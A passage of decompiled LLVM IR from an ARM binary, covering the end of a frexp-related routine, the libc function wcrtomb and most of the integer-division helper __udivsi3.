  store i32 %v0_16020, i32* @r2, align 4
  %v0_16024 = call i32 @frexp()
  %v0_16028 = load i32, i32* %r7.global-to-local, align 4
  %v1_16028 = inttoptr i32 %v0_16028 to i32*
  %v2_16028 = load i32, i32* %v1_16028, align 4
  store i32 %v0_16024, i32* @r5, align 4
  %v1_16030 = add i32 %v2_16028, -64
  %v0_16034 = load i32, i32* %r1.global-to-local, align 4
  store i32 %v0_16034, i32* @r6, align 4
  store i32 %v1_16030, i32* %v1_16028, align 4
  br label %dec_label_pc_16078

dec_label_pc_16040:                               ; preds = %entry
  %v3_16044 = icmp eq i32 %v3_15fd0, 2047
  br i1 %v3_16044, label %dec_label_pc_16078, label %dec_label_pc_1604c

dec_label_pc_1604c:                               ; preds = %dec_label_pc_16040
  store i32 -2146435073, i32* %r4.global-to-local, align 4
  %v1_16054 = add nsw i32 %v3_15fd0, -1022
  %v2_16058 = inttoptr i32 %v0_15fec to i32*
  store i32 %v1_16054, i32* %v2_16058, align 4
  %v0_16060 = load i32, i32* @r6, align 4
  %v1_16060 = load i32, i32* %r4.global-to-local, align 4
  %v2_16060 = and i32 %v1_16060, %v0_16060
  store i32 1071644672, i32* %r4.global-to-local, align 4
  %v0_16068 = load i32, i32* @r0, align 4
  store i32 %v0_16068, i32* %r1.global-to-local, align 4
  store i32 %v0_16068, i32* @r5, align 4
  %v2_16074 = or i32 %v2_16060, 1071644672
  store i32 %v2_16074, i32* @r6, align 4
  br label %dec_label_pc_16078

dec_label_pc_16078:                               ; preds = %bb, %dec_label_pc_16040, %dec_label_pc_1600c, %dec_label_pc_1604c
  %v0_16078 = load i32, i32* @r5, align 4
  %v0_1607c = load i32, i32* @r6, align 4
  store i32 %v0_1607c, i32* %r1.global-to-local, align 4
  store i32 %v3_15fc4, i32* @r4, align 4
  store i32 %v6_15fc4, i32* @r5, align 4
  store i32 %v12_15fc4, i32* %r7.global-to-local, align 4
  store i32 %v18_15fc4, i32* @sb, align 4
  ret i32 %v0_16078

; uselistorder directives
  uselistorder i32 %v0_16068, { 1, 0 }
  uselistorder i32 %v3_15fd0, { 2, 3, 1, 0 }
  uselistorder i32 %v0_15fc8, { 2, 1, 0 }
  uselistorder i32* %r7.global-to-local, { 1, 0 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 0 }
  uselistorder i32 ()* @frexp, { 1, 0 }
  uselistorder double 0.000000e+00, { 1, 2, 3, 4, 0 }
  uselistorder i32 ()* @__aeabi_dcmpeq, { 0, 6, 5, 4, 3, 2, 1 }
  uselistorder label %dec_label_pc_16078, { 3, 1, 2, 0 }
}

define i32 @wcrtomb(i8* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %ip.global-to-local = alloca i32, align 4
  %lr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %tmp = trunc i32 %arg2 to i8
  store i32 %arg2, i32* %r1.global-to-local, align 4
  %tmp18 = ptrtoint i8* %arg1 to i32
  store i32 %tmp18, i32* %r0.global-to-local, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_1609c = load i32, i32* @r4, align 4
  store i32 %v3_1609c, i32* %stack_var_-8, align 4
  store i32 %tmp18, i32* %r4.global-to-local, align 4
  %v3_160a0 = icmp eq i8* %arg1, null
  store i32 %arg2, i32* %ip.global-to-local, align 4
  br i1 %v3_160a0, label %bb, label %dec_label_pc_160b0

bb:                                               ; preds = %entry
  store i32 1, i32* %lr.global-to-local, align 4
  br label %dec_label_pc_161ec

dec_label_pc_160b0:                               ; preds = %entry
  %tmp22 = icmp sgt i8 %tmp, -1
  br i1 %tmp22, label %dec_label_pc_160f0, label %dec_label_pc_160b8

dec_label_pc_160b8:                               ; preds = %dec_label_pc_160b0
  %v0_160b8 = call i32 @__aeabi_read_tp()
  store i32 %v0_160b8, i32* %r0.global-to-local, align 4
  %v1_160bc = add i32 %v0_160b8, -48
  %v2_160bc = inttoptr i32 %v1_160bc to i32*
  %v3_160bc = load i32, i32* %v2_160bc, align 4
  store i32 %v3_160bc, i32* %r3.global-to-local, align 4
  %v1_160c0 = inttoptr i32 %v3_160bc to i32*
  %v2_160c0 = load i32, i32* %v1_160c0, align 4
  store i32 %v2_160c0, i32* %r3.global-to-local, align 4
  %v2_160c4 = icmp eq i32 %v2_160c0, 0
  br i1 %v2_160c4, label %dec_label_pc_160cc, label %dec_label_pc_160fc

dec_label_pc_160cc:                               ; preds = %dec_label_pc_160b8
  %v1_160d0 = add nsw i32 %arg2, -57216
  store i32 %v1_160d0, i32* %r3.global-to-local, align 4
  %tmp23 = icmp ult i32 %v1_160d0, 128
  br i1 %tmp23, label %dec_label_pc_160cc.dec_label_pc_160f0_crit_edge, label %dec_label_pc_160dc

dec_label_pc_160cc.dec_label_pc_160f0_crit_edge:  ; preds = %dec_label_pc_160cc
  %v0_160f4.pre = load i32, i32* %ip.global-to-local, align 4
  %v2_160f4.pre = load i32, i32* %r4.global-to-local, align 4
  %extract.t = trunc i32 %v0_160f4.pre to i8
  br label %dec_label_pc_160f0

dec_label_pc_160dc:                               ; preds = %dec_label_pc_160cc
  %v0_160dc = call i32 @__errno_location()
  store i32 %v0_160dc, i32* %r0.global-to-local, align 4
  store i32 84, i32* %r3.global-to-local, align 4
  store i32 -1, i32* %lr.global-to-local, align 4
  %v2_160e8 = inttoptr i32 %v0_160dc to i32*
  store i32 84, i32* %v2_160e8, align 4
  br label %dec_label_pc_161ec

dec_label_pc_160f0:                               ; preds = %dec_label_pc_160cc.dec_label_pc_160f0_crit_edge, %dec_label_pc_160b0
  %v2_160f4 = phi i32 [ %v2_160f4.pre, %dec_label_pc_160cc.dec_label_pc_160f0_crit_edge ], [ %tmp18, %dec_label_pc_160b0 ]
  %v0_160f4.off0 = phi i8 [ %extract.t, %dec_label_pc_160cc.dec_label_pc_160f0_crit_edge ], [ %tmp, %dec_label_pc_160b0 ]
  store i32 1, i32* %lr.global-to-local, align 4
  %v3_160f4 = inttoptr i32 %v2_160f4 to i8*
  store i8 %v0_160f4.off0, i8* %v3_160f4, align 1
  br label %dec_label_pc_161ec

dec_label_pc_160fc:                               ; preds = %dec_label_pc_160b8
  %v3_160fc = icmp slt i8 %tmp, 0
  br i1 %v3_160fc, label %dec_label_pc_1612c, label %dec_label_pc_16104

dec_label_pc_16104:                               ; preds = %dec_label_pc_160fc
  %v2_16104 = urem i32 %arg2, 64
  %v4_16108 = udiv i32 %arg2, 64
  %v4_1611410 = or i32 %v4_16108, -64
  store i32 %v4_1611410, i32* %r2.global-to-local, align 4
  %v4_1611811 = or i32 %v2_16104, -128
  store i32 %v4_1611811, i32* %r3.global-to-local, align 4
  store i32 2, i32* %lr.global-to-local, align 4
  %v1_16120 = trunc i32 %v4_1611811 to i8
  %v2_16120 = load i32, i32* %r4.global-to-local, align 4
  %v3_16120 = add i32 %v2_16120, 1
  %v4_16120 = inttoptr i32 %v3_16120 to i8*
  store i8 %v1_16120, i8* %v4_16120, align 1
  %v0_16124 = load i32, i32* %r2.global-to-local, align 4
  %v1_16124 = trunc i32 %v0_16124 to i8
  %v2_16124 = load i32, i32* %r4.global-to-local, align 4
  %v3_16124 = inttoptr i32 %v2_16124 to i8*
  store i8 %v1_16124, i8* %v3_16124, align 1
  br label %dec_label_pc_161ec

dec_label_pc_1612c:                               ; preds = %dec_label_pc_160fc
  %v2_1612c = add nsw i32 %arg2, -57344
  store i32 %v2_1612c, i32* %r3.global-to-local, align 4
  %v2_16130 = icmp ugt i32 %v2_1612c, 8191
  br i1 %v2_16130, label %dec_label_pc_1617c, label %dec_label_pc_1613c

dec_label_pc_1613c:                               ; preds = %dec_label_pc_1612c
  %v4_1613c = udiv i32 %arg2, 4096
  %v4_16140 = udiv i32 %arg2, 64
  %v0_16148 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_16148, i32* %r0.global-to-local, align 4
  %v4_1614c3 = or i32 %v4_1613c, -32
  store i32 %v4_1614c3, i32* %r2.global-to-local, align 4
  %v1_16150 = urem i32 %v4_16140, 64
  store i32 %v1_16150, i32* %r3.global-to-local, align 4
  %v2_16154 = urem i32 %arg2, 64
  store i32 %v2_16154, i32* %r1.global-to-local, align 4
  %v1_16158 = trunc i32 %v4_1614c3 to i8
  %v3_16158 = inttoptr i32 %v0_16148 to i8*
  store i8 %v1_16158, i8* %v3_16158, align 1
  %v4_16158 = load i32, i32* %r0.global-to-local, align 4
  %v5_16158 = add i32 %v4_16158, 1
  store i32 %v5_16158, i32* %r0.global-to-local, align 4
  %v0_1615c = load i32, i32* %r3.global-to-local, align 4
  %v0_16160 = load i32, i32* %r1.global-to-local, align 4
  %v4_1616412 = or i32 %v0_1615c, -128
  store i32 %v4_1616412, i32* %r3.global-to-local, align 4
  %v4_1616813 = or i32 %v0_16160, -128
  store i32 %v4_1616813, i32* %r1.global-to-local, align 4
  store i32 3, i32* %lr.global-to-local, align 4
  %v1_16170 = trunc i32 %v4_1616412 to i8
  %v2_16170 = load i32, i32* %r4.global-to-local, align 4
  %v3_16170 = add i32 %v2_16170, 1
  %v4_16170 = inttoptr i32 %v3_16170 to i8*
  store i8 %v1_16170, i8* %v4_16170, align 1
  %v0_16174 = load i32, i32* %r1.global-to-local, align 4
  %v1_16174 = trunc i32 %v0_16174 to i8
  %v2_16174 = load i32, i32* %r0.global-to-local, align 4
  %v3_16174 = add i32 %v2_16174, 1
  %v4_16174 = inttoptr i32 %v3_16174 to i8*
  store i8 %v1_16174, i8* %v4_16174, align 1
  br label %dec_label_pc_161ec

dec_label_pc_1617c:                               ; preds = %dec_label_pc_1612c
  %v2_1617c = add nsw i32 %arg2, -65536
  store i32 %v2_1617c, i32* %r3.global-to-local, align 4
  %v2_16180 = icmp ugt i32 %v2_1617c, 1048575
  br i1 %v2_16180, label %dec_label_pc_161dc, label %dec_label_pc_16188

dec_label_pc_16188:                               ; preds = %dec_label_pc_1617c
  %v4_16188 = udiv i32 %arg2, 262144
  %v0_1618c = load i32, i32* %ip.global-to-local, align 4
  %v3_1618c = udiv i32 %v0_1618c, 4096
  %v3_16190 = udiv i32 %v0_1618c, 64
  %v1_16198 = urem i32 %v0_1618c, 64
  store i32 %v1_16198, i32* %r0.global-to-local, align 4
  %v4_1619c5 = or i32 %v4_16188, -16
  store i32 %v4_1619c5, i32* %r1.global-to-local, align 4
  %v0_161a0 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_161a0, i32* %ip.global-to-local, align 4
  %v1_161a4 = urem i32 %v3_1618c, 64
  store i32 %v1_161a4, i32* %r3.global-to-local, align 4
  %v1_161a8 = urem i32 %v3_16190, 64
  store i32 %v1_161a8, i32* %r2.global-to-local, align 4
  %v1_161ac = trunc i32 %v4_1619c5 to i8
  %v3_161ac = inttoptr i32 %v0_161a0 to i8*
  store i8 %v1_161ac, i8* %v3_161ac, align 1
  %v4_161ac = load i32, i32* %ip.global-to-local, align 4
  %v5_161ac = add i32 %v4_161ac, 1
  store i32 %v5_161ac, i32* %ip.global-to-local, align 4
  %v0_161b0 = load i32, i32* %r3.global-to-local, align 4
  %v0_161b4 = load i32, i32* %r2.global-to-local, align 4
  %v0_161b8 = load i32, i32* %r0.global-to-local, align 4
  %v4_161bc14 = or i32 %v0_161b0, -128
  store i32 %v4_161bc14, i32* %r3.global-to-local, align 4
  %v4_161c015 = or i32 %v0_161b4, -128
  store i32 %v4_161c015, i32* %r2.global-to-local, align 4
  %v4_161c416 = or i32 %v0_161b8, -128
  store i32 %v4_161c416, i32* %r0.global-to-local, align 4
  store i32 4, i32* %lr.global-to-local, align 4
  %v1_161cc = trunc i32 %v4_161bc14 to i8
  %v2_161cc = load i32, i32* %r4.global-to-local, align 4
  %v3_161cc = add i32 %v2_161cc, 1
  %v4_161cc = inttoptr i32 %v3_161cc to i8*
  store i8 %v1_161cc, i8* %v4_161cc, align 1
  %v0_161d0 = load i32, i32* %r0.global-to-local, align 4
  %v1_161d0 = trunc i32 %v0_161d0 to i8
  %v2_161d0 = load i32, i32* %ip.global-to-local, align 4
  %v3_161d0 = add i32 %v2_161d0, 2
  %v4_161d0 = inttoptr i32 %v3_161d0 to i8*
  store i8 %v1_161d0, i8* %v4_161d0, align 1
  %v0_161d4 = load i32, i32* %r2.global-to-local, align 4
  %v1_161d4 = trunc i32 %v0_161d4 to i8
  %v2_161d4 = load i32, i32* %ip.global-to-local, align 4
  %v3_161d4 = add i32 %v2_161d4, 1
  %v4_161d4 = inttoptr i32 %v3_161d4 to i8*
  store i8 %v1_161d4, i8* %v4_161d4, align 1
  br label %dec_label_pc_161ec

dec_label_pc_161dc:                               ; preds = %dec_label_pc_1617c
  %v0_161dc = call i32 @__errno_location()
  store i32 %v0_161dc, i32* %r0.global-to-local, align 4
  store i32 84, i32* %r3.global-to-local, align 4
  %v2_161e4 = inttoptr i32 %v0_161dc to i32*
  store i32 84, i32* %v2_161e4, align 4
  store i32 -1, i32* %lr.global-to-local, align 4
  br label %dec_label_pc_161ec

dec_label_pc_161ec:                               ; preds = %bb, %dec_label_pc_16188, %dec_label_pc_1613c, %dec_label_pc_16104, %dec_label_pc_160f0, %dec_label_pc_160dc, %dec_label_pc_161dc
  %v0_161ec = load i32, i32* %lr.global-to-local, align 4
  store i32 %v0_161ec, i32* %r0.global-to-local, align 4
  %v2_161f0 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_161f0, i32* %r4.global-to-local, align 4
  ret i32 %v0_161ec

; uselistorder directives
  uselistorder i32 %v0_1618c, { 2, 0, 1 }
  uselistorder i8 %tmp, { 2, 1, 0 }
  uselistorder i32* %r3.global-to-local, { 0, 1, 2, 3, 7, 4, 5, 6, 8, 9, 10, 11, 12, 13 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 4, 5, 0 }
  uselistorder i32* %r0.global-to-local, { 1, 10, 2, 3, 4, 5, 6, 7, 8, 9, 11, 12, 0 }
  uselistorder i32* %lr.global-to-local, { 6, 0, 1, 2, 3, 5, 4, 7 }
  uselistorder i32 84, { 2, 4, 3, 5, 0, 1, 6, 7 }
  uselistorder i32 ()* @__errno_location, { 33, 32, 37, 9, 27, 26, 8, 29, 35, 7, 25, 0, 24, 23, 22, 21, 20, 30, 34, 28, 1, 6, 5, 4, 3, 2, 19, 18, 17, 36, 12, 11, 31, 10, 16, 15, 14, 13 }
  uselistorder i32 -48, { 16, 17, 18, 0, 1, 2, 3, 4, 5, 19, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15 }
  uselistorder i32 ()* @__aeabi_read_tp, { 7, 6, 5, 3, 2, 1, 4, 0 }
  uselistorder i8 -1, { 0, 1, 3, 4, 5, 2, 6, 7 }
  uselistorder i8* null, { 2, 1, 4, 3, 5, 6, 7, 0, 8, 9 }
  uselistorder i32 %arg2, { 0, 9, 3, 1, 2, 8, 4, 5, 7, 6, 11, 10 }
  uselistorder label %dec_label_pc_161ec, { 6, 1, 2, 3, 4, 5, 0 }
}

define i32 @__udivsi3(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* @r1, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %v0_161f8 = load i32, i32* @r1, align 4
  %v1_161f8 = add i32 %v0_161f8, -1
  store i32 %v1_161f8, i32* %r2.global-to-local, align 4
  %v2_161f8 = icmp eq i32 %v0_161f8, 0
  %v7_161f8 = icmp eq i32 %v0_161f8, 1
  %v0_161fc = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v7_161f8, i32 %v0_161fc)
  br i1 %v2_161f8, label %dec_label_pc_162e0, label %dec_label_pc_16204

dec_label_pc_16204:                               ; preds = %entry
  %v0_16204 = load i32, i32* %r0.global-to-local, align 4
  %v1_16204 = load i32, i32* @r1, align 4
  %tmp = icmp ugt i32 %v0_16204, %v1_16204
  br i1 %tmp, label %dec_label_pc_1620c, label %dec_label_pc_16298

dec_label_pc_1620c:                               ; preds = %dec_label_pc_16204
  %v1_1620c = load i32, i32* %r2.global-to-local, align 4
  %v2_1620c = and i32 %v1_1620c, %v1_16204
  %v4_1620c = icmp eq i32 %v2_1620c, 0
  br i1 %v4_1620c, label %dec_label_pc_162a4, label %dec_label_pc_16214

dec_label_pc_16214:                               ; preds = %dec_label_pc_1620c
  %v3_16214 = icmp ult i32 %v1_16204, 536870912
  br i1 %v3_16214, label %.thread, label %.preheader.preheader

.thread:                                          ; preds = %dec_label_pc_16214
  %v4_16218 = mul i32 %v1_16204, 8
  br label %.preheader.preheader

.preheader.preheader:                             ; preds = %dec_label_pc_16214, %.thread
  %v0_16238.pr36.ph = phi i32 [ %v4_16218, %.thread ], [ %v1_16204, %dec_label_pc_16214 ]
  %storemerge133 = phi i32 [ 8, %.thread ], [ 1, %dec_label_pc_16214 ]
  br label %.preheader

.preheader:                                       ; preds = %.preheader.preheader, %bb81
  %v0_16238.pr36 = phi i32 [ %v4_1622c, %bb81 ], [ %v0_16238.pr36.ph, %.preheader.preheader ]
  %v1_16230 = phi i32 [ %v4_16230, %bb81 ], [ %storemerge133, %.preheader.preheader ]
  %v2_16224 = icmp ugt i32 %v0_16238.pr36, 268435455
  br i1 %v2_16224, label %.thread2, label %bb

.thread2:                                         ; preds = %.preheader
  br label %dec_label_pc_16238thread-pre-split.loopexit

bb:                                               ; preds = %.preheader
  %v4_16228 = icmp ult i32 %v0_16238.pr36, %v0_16204
  br i1 %v4_16228, label %bb80, label %dec_label_pc_16238thread-pre-split.loopexit.loopexit

bb80:                                             ; preds = %bb
  %v2_1622c = and i32 %v0_16238.pr36, 268435456
  %v3_1622c = icmp eq i32 %v2_1622c, 0
  %v4_1622c = mul i32 %v0_16238.pr36, 16
  br i1 %v3_1622c, label %bb81, label %dec_label_pc_16238.loopexit

bb81:                                             ; preds = %bb80
  %v2_16230 = and i32 %v1_16230, 268435456
  %v3_16230 = icmp eq i32 %v2_16230, 0
  %v4_16230 = mul i32 %v1_16230, 16
  br i1 %v3_16230, label %.preheader, label %dec_label_pc_16238thread-pre-split.loopexit.loopexit

dec_label_pc_16238thread-pre-split.loopexit.loopexit: ; preds = %bb81, %bb
  %v1_1624448.ph = phi i32 [ %v1_16230, %bb ], [ %v4_16230, %bb81 ]
  %v0_16238.pr38.ph = phi i32 [ %v0_16238.pr36, %bb ], [ %v4_1622c, %bb81 ]
  br label %dec_label_pc_16238thread-pre-split.loopexit

dec_label_pc_16238thread-pre-split.loopexit:      ; preds = %dec_label_pc_16238thread-pre-split.loopexit.loopexit, %.thread2
  %v1_1624448 = phi i32 [ %v1_16230, %.thread2 ], [ %v1_1624448.ph, %dec_label_pc_16238thread-pre-split.loopexit.loopexit ]
  %v0_16238.pr38 = phi i32 [ %v0_16238.pr36, %.thread2 ], [ %v0_16238.pr38.ph, %dec_label_pc_16238thread-pre-split.loopexit.loopexit ]
  br label %dec_label_pc_16238thread-pre-split

dec_label_pc_16238thread-pre-split:               ; preds = %dec_label_pc_16238thread-pre-split.loopexit, %bb83
  %v1_1624446 = phi i32 [ %v1_1624448, %dec_label_pc_16238thread-pre-split.loopexit ], [ %v3_16244, %bb83 ]
  %v0_16238.pr = phi i32 [ %v0_16238.pr38, %dec_label_pc_16238thread-pre-split.loopexit ], [ %v3_16240, %bb83 ]
  br label %dec_label_pc_16238

dec_label_pc_16238.loopexit:                      ; preds = %bb80
  br label %dec_label_pc_16238

dec_label_pc_16238:                               ; preds = %dec_label_pc_16238.loopexit, %dec_label_pc_16238thread-pre-split
  %v1_16244 = phi i32 [ %v1_1624446, %dec_label_pc_16238thread-pre-split ], [ %v1_16230, %dec_label_pc_16238.loopexit ]
  %v1_16240 = phi i32 [ %v0_16238.pr, %dec_label_pc_16238thread-pre-split ], [ %v4_1622c, %dec_label_pc_16238.loopexit ]
  %v2_16238 = icmp slt i32 %v1_16240, 0
  br i1 %v2_16238, label %dec_label_pc_1624c, label %bb82

bb82:                                             ; preds = %dec_label_pc_16238
  %v4_1623c = icmp ult i32 %v1_16240, %v0_16204
  br i1 %v4_1623c, label %bb83, label %dec_label_pc_1624c

bb83:                                             ; preds = %bb82
  %v3_16240 = mul i32 %v1_16240, 2
  %v2_16244 = icmp slt i32 %v1_16244, 0
  %v3_16244 = mul i32 %v1_16244, 2
  br i1 %v2_16244, label %dec_label_pc_1624c, label %dec_label_pc_16238thread-pre-split

dec_label_pc_1624c:                               ; preds = %bb82, %dec_label_pc_16238, %bb83
  %v2_1625859 = phi i32 [ %v3_16244, %bb83 ], [ %v1_16244, %bb82 ], [ %v1_16244, %dec_label_pc_16238 ]
  %v1_1625051 = phi i32 [ %v3_16240, %bb83 ], [ %v1_16240, %bb82 ], [ %v1_16240, %dec_label_pc_16238 ]
  store i32 0, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_16250

dec_label_pc_16250:                               ; preds = %.thread11, %dec_label_pc_1624c
  %v1_16284 = phi i32 [ %v4_16284, %.thread11 ], [ %v2_1625859, %dec_label_pc_1624c ]
  %v1_16258 = phi i32 [ %v0_16290, %.thread11 ], [ 0, %dec_label_pc_1624c ]
  %v1_16288 = phi i32 [ %v4_16288, %.thread11 ], [ %v1_1625051, %dec_label_pc_1624c ]
  %v1_16254 = phi i32 [ %v0_16280, %.thread11 ], [ %v0_16204, %dec_label_pc_1624c ]
  %v3_16250 = icmp ult i32 %v1_16254, %v1_16288
  br i1 %v3_16250, label %.thread7, label %bb84

bb84:                                             ; preds = %dec_label_pc_16250
  %v3_16254 = sub i32 %v1_16254, %v1_16288
  store i32 %v3_16254, i32* %r0.global-to-local, align 4
  %v3_16258 = or i32 %v1_16258, %v1_16284
  store i32 %v3_16258, i32* %r2.global-to-local, align 4
  br label %.thread7

.thread7:                                         ; preds = %dec_label_pc_16250, %bb84
  %v1_16260 = phi i32 [ %v1_16254, %dec_label_pc_16250 ], [ %v3_16254, %bb84 ]
  %v1_16264 = phi i32 [ %v1_16258, %dec_label_pc_16250 ], [ %v3_16258, %bb84 ]
  %v4_1625c = udiv i32 %v1_16288, 2
  %v6_1625c = icmp ult i32 %v1_16260, %v4_1625c
  br i1 %v6_1625c, label %.thread8, label %bb85

bb85:                                             ; preds = %.thread7
  %v3_16260 = urem i32 %v1_16288, 2
  %v4_16260 = icmp eq i32 %v3_16260, 0
  %v6_16260 = sub i32 %v1_16260, %v4_1625c
  store i32 %v6_16260, i32* %r0.global-to-local, align 4
  br i1 %v4_16260, label %.thread8, label %bb86

bb86:                                             ; preds = %bb85
  %v5_16264 = udiv i32 %v1_16284, 2
  %v6_16264 = or i32 %v1_16264, %v5_16264
  store i32 %v6_16264, i32* %r2.global-to-local, align 4
  br label %.thread8

.thread8:                                         ; preds = %bb85, %.thread7, %bb86
  %v1_1626c = phi i32 [ %v6_16260, %bb85 ], [ %v1_16260, %.thread7 ], [ %v6_16260, %bb86 ]
  %v1_16270 = phi i32 [ %v1_16264, %bb85 ], [ %v1_16264, %.thread7 ], [ %v6_16264, %bb86 ]
  %v4_16268 = udiv i32 %v1_16288, 4
  %v6_16268 = icmp ult i32 %v1_1626c, %v4_16268
  br i1 %v6_16268, label %.thread9, label %bb87

bb87:                                             ; preds = %.thread8
  %v3_1626c = and i32 %v1_16288, 2
  %v4_1626c = icmp eq i32 %v3_1626c, 0
  %v6_1626c = sub i32 %v1_1626c, %v4_16268
  store i32 %v6_1626c, i32* %r0.global-to-local, align 4
  br i1 %v4_1626c, label %.thread9, label %bb88

bb88:                                             ; preds = %bb87
  %v5_16270 = udiv i32 %v1_16284, 4
  %v6_16270 = or i32 %v1_16270, %v5_16270
  store i32 %v6_16270, i32* %r2.global-to-local, align 4
  br label %.thread9

.thread9:                                         ; preds = %bb87, %.thread8, %bb88
  %v1_16278 = phi i32 [ %v6_1626c, %bb87 ], [ %v1_1626c, %.thread8 ], [ %v6_1626c, %bb88 ]
  %v1_1627c = phi i32 [ %v1_16270, %bb87 ], [ %v1_16270, %.thread8 ], [ %v6_16270, %bb88 ]
  %v4_16274 = udiv i32 %v1_16288, 8
  %v6_16274 = icmp ult i32 %v1_16278, %v4_16274
  br i1 %v6_16274, label %thread-pre-split, label %bb89

bb89:                                             ; preds = %.thread9
  %v3_16278 = and i32 %v1_16288, 4
  %v4_16278 = icmp eq i32 %v3_16278, 0
  %v6_16278 = sub i32 %v1_16278, %v4_16274
  store i32 %v6_16278, i32* %r0.global-to-local, align 4
  br i1 %v4_16278, label %thread-pre-split, label %bb90

bb90:                                             ; preds = %bb89
  %v5_1627c = udiv i32 %v1_16284, 8
  %v6_1627c = or i32 %v1_1627c, %v5_1627c
  store i32 %v6_1627c, i32* %r2.global-to-local, align 4
  br label %thread-pre-split

thread-pre-split:                                 ; preds = %bb90, %.thread9, %bb89
  %v0_16290 = phi i32 [ %v1_1627c, %bb89 ], [ %v1_1627c, %.thread9 ], [ %v6_1627c, %bb90 ]
  %v0_16280 = phi i32 [ %v6_16278, %bb89 ], [ %v1_16278, %.thread9 ], [ %v6_16278, %bb90 ]
  %v2_16280 = icmp eq i32 %v0_16280, 0
  br i1 %v2_16280, label %dec_label_pc_16290, label %bb91

bb91:                                             ; preds = %thread-pre-split
  %tmp138 = icmp ult i32 %v1_16284, 16
  br i1 %tmp138, label %dec_label_pc_16290, label %.thread11

.thread11:                                        ; preds = %bb91
  %v4_16284 = udiv i32 %v1_16284, 16
  %v4_16288 = udiv i32 %v1_16288, 16
  br label %dec_label_pc_16250

dec_label_pc_16290:                               ; preds = %thread-pre-split, %bb91
  store i32 %v0_16290, i32* %r0.global-to-local, align 4
  ret i32 %v0_16290

dec_label_pc_16298:                               ; preds = %dec_label_pc_16204
  %v9_16204 = icmp eq i32 %v0_16204, %v1_16204
  %. = zext i1 %v9_16204 to i32
  store i32 %., i32* %r0.global-to-local, align 4
  ret i32 %.

dec_label_pc_162a4:                               ; preds = %dec_label_pc_1620c
  %v2_162a4 = icmp ugt i32 %v1_16204, 65535
  br i1 %v2_162a4, label %bb95, label %.thread16

bb95:                                             ; preds = %dec_label_pc_162a4
  %v2_162a8 = and i32 %v1_16204, 32768
  %v3_162a8 = icmp eq i32 %v2_162a8, 0
  %v4_162a8 = udiv i32 %v1_16204, 65536
  br i1 %v3_162a8, label %.thread16, label %bb96

.thread16:                                        ; preds = %bb95, %dec_label_pc_162a4
  %v0_162b465 = phi i32 [ %v1_16204, %dec_label_pc_162a4 ], [ %v4_162a8, %bb95 ]
  br label %bb96

bb96:                                             ; preds = %bb95, %.thread16
  %v1_162b8 = phi i32 [ %v0_162b465, %.thread16 ], [ %v4_162a8, %bb95 ]
  %storemerge = phi i32 [ 0, %.thread16 ], [ 16, %bb95 ]
  store i32 %storemerge, i32* %r2.global-to-local, align 4
  %v2_162b4 = icmp ugt i32 %v1_162b8, 255
  br i1 %v2_162b4, label %bb97, label %.thread17

bb97:                                             ; preds = %bb96
  %v2_162b8 = and i32 %v1_162b8, 128
  %v3_162b8 = icmp eq i32 %v2_162b8, 0
  %v4_162b8 = udiv i32 %v1_162b8, 256
  br i1 %v3_162b8, label %.thread17, label %bb98

bb98:                                             ; preds = %bb97
  %v2_162bc = or i32 %storemerge, 8
  store i32 %v2_162bc, i32* %r2.global-to-local, align 4
  br label %.thread17

.thread17:                                        ; preds = %bb97, %bb96, %bb98
  %v1_162c8 = phi i32 [ %storemerge, %bb96 ], [ %storemerge, %bb97 ], [ %v2_162bc, %bb98 ]
  %v1_162c4 = phi i32 [ %v1_162b8, %bb96 ], [ %v4_162b8, %bb97 ], [ %v4_162b8, %bb98 ]
  %v2_162c0 = icmp ugt i32 %v1_162c4, 15
  br i1 %v2_162c0, label %bb99, label %.thread18

bb99:                                             ; preds = %.thread17
  %v2_162c4 = and i32 %v1_162c4, 8
  %v3_162c4 = icmp eq i32 %v2_162c4, 0
  %v4_162c4 = udiv i32 %v1_162c4, 16
  br i1 %v3_162c4, label %.thread18, label %bb100

bb100:                                            ; preds = %bb99
  %v2_162c8 = add nsw i32 %v1_162c8, 4
  store i32 %v2_162c8, i32* %r2.global-to-local, align 4
  br label %.thread18

.thread18:                                        ; preds = %bb99, %.thread17, %bb100
  %v4_162d0 = phi i32 [ %v1_162c8, %.thread17 ], [ %v1_162c8, %bb99 ], [ %v2_162c8, %bb100 ]
  %v5_162d4 = phi i32 [ %v1_162c4, %.thread17 ], [ %v4_162c4, %bb99 ], [ %v4_162c4, %bb100 ]
  %v2_162cc = icmp ugt i32 %v5_162d4, 3
  %v7_162cc = icmp eq i32 %v5_162d4, 4
  %v2_162d0 = xor i1 %v7_162cc, true
  %v3_162d0 = and i1 %v2_162cc, %v2_162d0
  br i1 %v3_162d0, label %bb101, label %bb102

bb101:                                            ; preds = %.thread18
  %v5_162d0 = add nsw i32 %v4_162d0, 3
  store i32 %v5_162d0, i32* %r2.global-to-local, align 4
  br label %bb102

bb102:                                            ; preds = %.thread18, %bb101
  %v4_162d4 = phi i32 [ %v4_162d0, %.thread18 ], [ %v5_162d0, %bb101 ]
  %v2_162d4 = xor i1 %v2_162cc, true
  %v3_162d4 = or i1 %v7_162cc, %v2_162d4
  br i1 %v3_162d4, label %bb103, label %bb104

bb103:                                            ; preds = %bb102
  %v8_162d4 = udiv i32 %v5_162d4, 2
  %v9_162d4 = add i32 %v4_162d4, %v8_162d4
  store i32 %v9_162d4, i32* %r2.global-to-local, align 4
  br label %bb104

bb104:                                            ; preds = %bb102, %bb103
  %v1_162d8 = phi i32 [ %v4_162d4, %bb102 ], [ %v9_162d4, %bb103 ]
  %v6_162d8 = lshr i32 %v0_16204, %v1_162d8
